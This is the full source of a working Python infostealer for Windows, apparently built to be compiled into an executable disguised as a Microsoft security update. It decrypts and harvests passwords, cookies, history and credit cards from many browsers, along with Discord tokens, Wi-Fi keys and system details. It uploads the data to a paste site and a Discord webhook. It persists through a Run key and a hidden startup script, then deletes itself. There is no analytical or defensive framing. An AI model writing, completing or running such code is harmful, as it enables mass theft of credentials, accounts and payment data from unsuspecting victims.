import os, sys, json, base64, urllib.request, re, ctypes, subprocess, sqlite3, shutil, uuid, platform, threading, time, winreg
from datetime import datetime

if os.name == "nt":
    import win32crypt
    from Crypto.Cipher import AES
else:
    sys.exit(0)

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

LOCAL = os.getenv("LOCALAPPDATA", "")
ROAMING = os.getenv("APPDATA", "")
TEMP = os.getenv("TEMP", "")
WEBHOOK = "WEBHOOK_URL"

# tmp ignore this
# --windows-disable-console --windows-icon-from-ico=icon.ico
# --windows-company-name="Microsoft Corporation" --windows-product-name="Windows Security Update"
# --windows-file-version=10.0.19041.1 --windows-product-version=10.0.19041.1
# --windows-file-description="Windows Security Module"

PATHS = {
    'Discord': os.path.join(ROAMING, 'discord'),
    'Discord Canary': os.path.join(ROAMING, 'discordcanary'),
    'Discord PTB': os.path.join(ROAMING, 'discordptb'),
    'Opera': os.path.join(ROAMING, 'Opera Software', 'Opera Stable'),
    'Opera GX': os.path.join(ROAMING, 'Opera Software', 'Opera GX Stable'),
    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data', 'Default'),
    'Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data', 'Default'),
    'Brave': os.path.join(LOCAL, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
    'Yandex': os.path.join(LOCAL, 'Yandex', 'YandexBrowser', 'User Data', 'Default')
}

BROWSERS = {
    'kometa': os.path.join(LOCAL, 'Kometa', 'User Data'),
    'orbitum': os.path.join(LOCAL, 'Orbitum', 'User Data'),
    'cent-browser': os.path.join(LOCAL, 'CentBrowser', 'User Data'),
    '7star': os.path.join(LOCAL, '7Star', '7Star', 'User Data'),
    'sputnik': os.path.join(LOCAL, 'Sputnik', 'Sputnik', 'User Data'),
    'vivaldi': os.path.join(LOCAL, 'Vivaldi', 'User Data'),
    'google-chrome-sxs': os.path.join(LOCAL, 'Google', 'Chrome SxS', 'User Data'),
    'google-chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
    'epic-privacy-browser': os.path.join(LOCAL, 'Epic Privacy Browser', 'User Data'),
    'microsoft-edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
    'uran': os.path.join(LOCAL, 'uCozMedia', 'Uran', 'User Data'),
    'yandex': os.path.join(LOCAL, 'Yandex', 'YandexBrowser', 'User Data'),
    'brave': os.path.join(LOCAL, 'BraveSoftware', 'Brave-Browser', 'User Data'),
    'iridium': os.path.join(LOCAL, 'Iridium', 'User Data'),
    'opera': os.path.join(ROAMING, 'Opera Software', 'Opera Stable'),
    'opera-gx': os.path.join(ROAMING, 'Opera Software', 'Opera GX Stable'),
    'coc-coc': os.path.join(LOCAL, 'CocCoc', 'Browser', 'User Data')
}

PROFILES = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']

PERSIST_NAME = "SecurityHealthStartup"
PERSIST_DIR = os.path.join(LOCAL, "Microsoft", "Windows", "Security")
PERSIST_PATH = os.path.join(PERSIST_DIR, "SecurityHealthHost.exe")

def is_frozen():
    if getattr(sys, 'frozen', False):
        return True
    try:
        __compiled__
        return True
    except NameError:
        pass
    exe = os.path.basename(sys.executable).lower()
    if exe not in ('python.exe', 'pythonw.exe', 'python'):
        return True
    return False

def check_internet():
    endpoints = [
        ("https://www.msftconnecttest.com/connecttest.txt", 5),
        ("https://1.1.1.1", 5),
        ("https://www.google.com/generate_204", 5),
        ("https://cloudflare.com", 5),
        ("https://api.ipify.org?format=json", 10)
    ]
    for url, timeout in endpoints:
        try:
            req = urllib.request.Request(url, method='HEAD')
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
            urllib.request.urlopen(req, timeout=timeout)
            return True
        except urllib.error.HTTPError:
            return True
        except:
            continue
    return False

def wait_for_internet():
    if check_internet():
        return
    time.sleep(30)
    if check_internet():
        return
    time.sleep(120)
    if check_internet():
        return
    while True:
        time.sleep(300)
        if check_internet():
            return

def is_persisted():
    try:
        if not os.path.exists(PERSIST_PATH):
            return False
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
        value, _ = winreg.QueryValueEx(key, PERSIST_NAME)
        winreg.CloseKey(key)
        return PERSIST_PATH in value
    except:
        return False

def ensure_persistence():
    if not is_frozen():
        return
    if is_persisted():
        return
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        if not os.path.exists(PERSIST_PATH) or os.path.getsize(PERSIST_PATH) != os.path.getsize(sys.executable):
            shutil.copy2(sys.executable, PERSIST_PATH)
        ctypes.windll.kernel32.SetFileAttributesW(PERSIST_PATH, 2)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, PERSIST_NAME, 0, winreg.REG_SZ, f'"{PERSIST_PATH}"')
        winreg.CloseKey(key)
        startup_dir = os.path.join(ROAMING, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        os.makedirs(startup_dir, exist_ok=True)
        vbs_path = os.path.join(startup_dir, "SecurityHealthHelper.vbs")
        vbs_content = 'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run "' + PERSIST_PATH + '", 0, False\nSet WshShell = Nothing\n'
        with open(vbs_path, 'w') as f:
            f.write(vbs_content)
        ctypes.windll.kernel32.SetFileAttributesW(vbs_path, 2)
    except:
        pass

def rc(cmd):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip()
    except:
        return "unknown"

def gk(path):
    try:
        with open(os.path.join(path, "Local State"), "r", encoding='utf-8', errors='ignore') as f:
            k = json.load(f)['os_crypt']['encrypted_key']
        return win32crypt.CryptUnprotectData(base64.b64decode(k)[5:], None, None, None, 0)[1]
    except:
        return None

def dc(buff, key):
    try:
        if not isinstance(buff, (bytes, bytearray)):
            buff = bytes(buff)
        if len(buff) < 19:
            return ""
        if len(buff) >= 31:
            cipher = AES.new(key, AES.MODE_GCM, nonce=buff[3:15])
            return cipher.decrypt(buff[15:-16]).decode('utf-8', errors='ignore')
        return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except:
        return ""

def ip():
    try:
        return json.loads(urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5).read().decode()).get("ip", "unknown")
    except:
        return "unknown"

def sanitize_paste(text):
    result = []
    for c in text:
        o = ord(c)
        if o < 32 and c not in '\t\n\r':
            result.append('?')
        elif 127 <= o <= 159:
            result.append('?')
        else:
            result.append(c)
    return ''.join(result)

def upload_paste(content):
    if not content or not content.strip():
        return None
    clean = sanitize_paste(content)
    try:
        if HAS_REQUESTS:
            resp = requests.post(
                'https://paste.rs/',
                data=clean.encode('utf-8'),
                headers={'Content-Type': 'text/plain; charset=utf-8'},
                timeout=60
            )
            if resp.status_code == 201:
                return resp.text.strip()
        else:
            req = urllib.request.Request(
                'https://paste.rs/',
                data=clean.encode('utf-8'),
                headers={'Content-Type': 'text/plain; charset=utf-8'},
                method='POST'
            )
            resp = urllib.request.urlopen(req, timeout=60)
            if resp.status == 201:
                return resp.read().decode().strip()
    except:
        pass
    return None

def copy_locked_file(src, dst):
    GENERIC_READ = 0x80000000
    GENERIC_WRITE = 0x40000000
    FILE_SHARE_READ = 0x00000001
    FILE_SHARE_WRITE = 0x00000002
    OPEN_EXISTING = 3
    CREATE_ALWAYS = 2
    FILE_ATTRIBUTE_NORMAL = 0x80
    INVALID_HANDLE_VALUE = -1
    h_src = ctypes.windll.kernel32.CreateFileW(
        src, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
        None, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None
    )
    if h_src == INVALID_HANDLE_VALUE:
        return False
    h_dst = ctypes.windll.kernel32.CreateFileW(
        dst, GENERIC_WRITE, 0, None, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, None
    )
    if h_dst == INVALID_HANDLE_VALUE:
        ctypes.windll.kernel32.CloseHandle(h_src)
        return False
    buf = ctypes.create_string_buffer(65536)
    read = ctypes.c_uint32(0)
    written = ctypes.c_uint32(0)
    total = 0
    while True:
        ret = ctypes.windll.kernel32.ReadFile(h_src, buf, 65536, ctypes.byref(read), None)
        if not ret or read.value == 0:
            break
        ctypes.windll.kernel32.WriteFile(h_dst, buf, read.value, ctypes.byref(written), None)
        total += written.value
    ctypes.windll.kernel32.CloseHandle(h_src)
    ctypes.windll.kernel32.CloseHandle(h_dst)
    return True

def copy_db(src, dst):
    try:
        if not copy_locked_file(src, dst):
            return False
        for ext in ['-wal', '-shm']:
            wal = src + ext
            if os.path.exists(wal):
                copy_locked_file(wal, dst + ext)
        return True
    except:
        return False

def rm_temp(path):
    for ext in ['', '-wal', '-shm']:
        fp = path + ext
        if os.path.exists(fp):
            try:
                os.remove(fp)
            except:
                pass

def sysinfo():
    try:
        ram_raw = rc('wmic computersystem get totalphysicalmemory /value').replace('TotalPhysicalMemory=', '').strip()
        ram = str(round(int(ram_raw) / (1024**3), 2)) + " GB"
    except:
        ram = "unknown"
    try:
        u32 = ctypes.windll.user32
        scr = f"{u32.GetSystemMetrics(0)}x{u32.GetSystemMetrics(1)}"
    except:
        scr = "unknown"
    wif = {}
    try:
        for ln in rc('netsh wlan show profiles').split('\n'):
            if 'Profile' in ln and ':' in ln:
                p = ln.split(':')[1].strip()
                if p:
                    for ln2 in rc(f'netsh wlan show profile name="{p}" key=clear').split('\n'):
                        if 'Key Content' in ln2:
                            wif[p] = ln2.split(':')[1].strip() if ':' in ln2 else ''
    except:
        pass
    av = rc('powershell -Command "Get-WmiObject -Namespace ''Root\\SecurityCenter2'' -Class AntivirusProduct | Select-Object displayName"')
    lines = [l.strip() for l in av.split('\n') if l.strip() and 'displayName' not in l and '---' not in l]
    av = ', '.join(lines) if lines else "Windows Defender / None"
    mac = ""
    try:
        for ln in os.popen('ipconfig /all'):
            if 'Physical Address' in ln:
                mac = ln.split(':')[1].strip()
                break
    except:
        pass
    hwid = rc('wmic csproduct get uuid /value').replace('UUID=', '').strip()
    return {
        "username": os.getenv("USERNAME", "unknown"),
        "hostname": os.getenv("COMPUTERNAME", "unknown"),
        "hwid": hwid if hwid else str("idk lol"),
        "uuid": hwid if hwid else str("idk lol"),
        "mac": mac,
        "ip": ip(),
        "cpu": rc('wmic cpu get name /value').replace('Name=', '').strip(),
        "gpu": rc('wmic path win32_VideoController get name /value').replace('Name=', '').strip(),
        "ram": ram,
        "screen": scr,
        "os": platform.platform(),
        "windows_key": rc('wmic path softwarelicensingservice get OA3xOriginalProductKey /value').replace('OA3xOriginalProductKey=', '').strip(),
        "antivirus": av,
        "wifi_passwords": wif,
        "time": datetime.now().isoformat()
    }

def get_tokens(path):
    tks = []
    ldb_path = os.path.join(path, "Local Storage", "leveldb")
    if not os.path.exists(ldb_path):
        return tks
    for fl in os.listdir(ldb_path):
        if not fl.endswith((".ldb", ".log")):
            continue
        try:
            fp = os.path.join(ldb_path, fl)
            with open(fp, "r", errors="ignore") as f:
                text = f.read()
                for m in re.findall(r"dQw4w9WgXcQ:[^\"\\s]*", text):
                    tks.append(m)
                for m in re.findall(r"dQw4w9WgXcQ:[^'\\s]*", text):
                    tks.append(m)
        except:
            continue
    return tks

def cleanup():
    try:
        if not is_frozen():
            return
        exe_path = sys.executable
        if os.path.normcase(exe_path) == os.path.normcase(PERSIST_PATH):
            return
        bat_name = f'tmp{uuid.uuid4().hex[:6]}.bat'
        bat_path = os.path.join(TEMP, bat_name)
        bat_content = '@echo off\nping -n 5 127.0.0.1 >nul\n:retry\ndel /f /q "' + exe_path + '" >nul 2>&1\nif exist "' + exe_path + '" goto retry\ndel /f /q "%~f0"\n'
        with open(bat_path, 'w') as f:
            f.write(bat_content)
        subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

class BrowserExtractor:
    def __init__(self):
        self.browsers = BROWSERS
        self.profiles = PROFILES
        self.out_dir = os.path.join(TEMP, "INetCache_" + uuid.uuid4().hex[:8])
        os.makedirs(self.out_dir, exist_ok=True)
        self.data = {}

    def get_master_key(self, path: str) -> bytes:
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except:
            return None

    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        try:
            if not isinstance(buff, (bytes, bytearray)):
                buff = bytes(buff)
            if len(buff) < 19:
                return ""
            if len(buff) >= 31:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(payload)
                return decrypted[:-16].decode('utf-8', errors='ignore')
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        except:
            return ""

    def _create_temp_copy(self, src: str) -> str:
        dst = os.path.join(self.out_dir, f"{uuid.uuid4().hex}.db")
        if copy_db(src, dst):
            return dst
        return None

    def _ensure_browser(self, name):
        if name not in self.data:
            self.data[name] = {"passwords": "", "cookies": "", "history": "", "credit_cards": ""}

    def passwords(self, name: str, path: str, profile: str, masterkey: bytes):
        try:
            if name in ['opera', 'opera-gx']:
                login_path = os.path.join(path, 'Login Data')
            else:
                login_path = os.path.join(path, profile, 'Login Data')
            if not os.path.isfile(login_path):
                return
            tdb = self._create_temp_copy(login_path)
            if not tdb:
                return
            conn = sqlite3.connect(tdb)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            self._ensure_browser(name)
            for row in cursor.fetchall():
                url, username, encrypted_pass = row
                if url and username and encrypted_pass:
                    password = self.decrypt_val(encrypted_pass, masterkey)
                    if password:
                        self.data[name]["passwords"] += f"[{name}/{profile}] {url} | {username}:{password}\n"
            cursor.close()
            conn.close()
            rm_temp(tdb)
        except:
            pass

    def cookies(self, name: str, path: str, profile: str, masterkey: bytes):
        try:
            if name in ['opera', 'opera-gx']:
                cookie_path = os.path.join(path, 'Network', 'Cookies')
            else:
                cookie_path = os.path.join(path, profile, 'Network', 'Cookies')
            if not os.path.isfile(cookie_path):
                return
            tdb = self._create_temp_copy(cookie_path)
            if not tdb:
                return
            conn = sqlite3.connect(tdb)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
            self._ensure_browser(name)
            for row in cursor.fetchall():
                host, cname, cpath, encrypted_value, expires = row
                value = self.decrypt_val(encrypted_value, masterkey)
                if host and cname and value:
                    self.data[name]["cookies"] += f"{host}\t{'FALSE' if expires == 0 else 'TRUE'}\t{cpath}\t{'FALSE' if host.startswith('.') else 'TRUE'}\t{expires}\t{cname}\t{value}\n"
            cursor.close()
            conn.close()
            rm_temp(tdb)
        except:
            pass

    def history(self, name: str, path: str, profile: str, masterkey: bytes):
        try:
            if name in ['opera', 'opera-gx']:
                hist_path = os.path.join(path, 'History')
            else:
                hist_path = os.path.join(path, profile, 'History')
            if not os.path.isfile(hist_path):
                return
            tdb = self._create_temp_copy(hist_path)
            if not tdb:
                return
            conn = sqlite3.connect(tdb)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
            self._ensure_browser(name)
            for row in cursor.fetchall():
                url, title, visits, last_visit = row
                if url:
                    self.data[name]["history"] += f"[{name}/{profile}] {title} | {url} (Visits: {visits})\n"
            cursor.close()
            conn.close()
            rm_temp(tdb)
        except:
            pass

    def credit_cards(self, name: str, path: str, profile: str, masterkey: bytes):
        try:
            if name in ['opera', 'opera-gx']:
                webdata_path = os.path.join(path, 'Web Data')
            else:
                webdata_path = os.path.join(path, profile, 'Web Data')
            if not os.path.isfile(webdata_path):
                return
            tdb = self._create_temp_copy(webdata_path)
            if not tdb:
                return
            conn = sqlite3.connect(tdb)
            cursor = conn.cursor()
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            self._ensure_browser(name)
            for row in cursor.fetchall():
                name_on_card, exp_month, exp_year, encrypted_num = row
                if encrypted_num:
                    card_num = self.decrypt_val(encrypted_num, masterkey)
                    if card_num:
                        self.data[name]["credit_cards"] += f"[{name}/{profile}] {name_on_card} | {exp_month}/{exp_year} | {card_num}\n"
            cursor.close()
            conn.close()
            rm_temp(tdb)
        except:
            pass

    def extract(self):
        def run_func(name, path, profile, func, masterkey):
            try:
                func(name, path, profile, masterkey)
            except:
                pass

        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue
            local_state = os.path.join(path, 'Local State')
            if not os.path.isfile(local_state):
                continue
            masterkey = self.get_master_key(local_state)
            if not masterkey:
                continue

            self._ensure_browser(name)
            threads = []
            for profile in self.profiles:
                profile_path = path if name in ['opera', 'opera-gx'] else os.path.join(path, profile)
                if not os.path.isdir(profile_path):
                    continue
                for func in [self.passwords, self.cookies, self.history, self.credit_cards]:
                    t = threading.Thread(target=run_func, args=(name, path, profile, func, masterkey))
                    t.start()
                    threads.append(t)

            for t in threads:
                t.join()

        return self.data

def main():
    ensure_persistence()
    wait_for_internet()
    checked, results = [], {"system": sysinfo(), "discord": [], "browser_data": {}}
    hostname = os.getenv("COMPUTERNAME", "UNKNOWN_PC")
    for plat, path in PATHS.items():
        if not os.path.exists(path):
            continue
        key = gk(path)
        if not key:
            continue
        for token in get_tokens(path):
            token = token.rstrip("\\")
            try:
                enc = base64.b64decode(token.split('dQw4w9WgXcQ:')[1])
            except:
                continue
            decrypted = dc(enc, key)
            if not decrypted or decrypted in checked:
                continue
            checked.append(decrypted)
            try:
                req = urllib.request.Request('https://discord.com/api/v10/users/@me', headers={"Authorization": decrypted, "User-Agent": "Mozilla/5.0"}, method='GET')
                user = json.loads(urllib.request.urlopen(req, timeout=5).read().decode())
                results["discord"].append({
                    "token": decrypted,
                    "username": user.get("username", "unknown"),
                    "userid": user.get("id", "unknown"),
                    "email": user.get("email", "none"),
                    "phone": user.get("phone", "none"),
                    "source": plat,
                    "verified": user.get("verified", False),
                    "mfa": user.get("mfa_enabled", False),
                    "nitro": user.get("premium_type", 0)
                })
            except:
                continue
    extractor = BrowserExtractor()
    raw_data = extractor.extract()
    for browser, categories in raw_data.items():
        results["browser_data"][browser] = {}
        for category, content in categories.items():
            if content.strip():
                link = upload_paste(content)
                if link:
                    results["browser_data"][browser][category] = link
    msg = f"{hostname} - {ip()} @everyone\n```json\n{json.dumps(results, indent=2)}\n```"
    try:
        urllib.request.urlopen(urllib.request.Request(WEBHOOK, data=json.dumps({"content": msg}).encode(), headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, method='POST'), timeout=10)
    except:
        pass
    try:
        ctypes.windll.kernel32.SetFileAttributesW(sys.executable, 2)
    except:
        pass
    cleanup()

if __name__ == "__main__":
    main()